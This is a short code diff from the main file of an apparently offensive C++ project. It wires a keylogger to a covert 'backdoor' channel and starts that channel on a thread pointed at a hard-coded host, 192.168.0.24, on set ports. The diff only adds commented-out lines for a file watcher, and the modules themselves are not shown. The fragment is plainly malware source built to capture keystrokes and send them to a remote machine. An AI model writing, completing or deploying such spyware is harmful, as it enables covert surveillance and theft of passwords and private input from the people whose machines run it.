@@ -1,12 +1,14 @@
 
 #include "covert_channel/backdoor_channel.h"
 #include "keylogger/keylogger.h"
+//#include "file_watcher/file_watcher.h"
 #include <thread>
 
 int main(){
 
     Backdoor_Channel ch;
     Key_Logger kl(ch);
+    //File_Watcher fw;
     
     
     std::thread bd_thread(&Backdoor_Channel::start, &ch, "lo", 8000, 9000, "192.168.0.24");
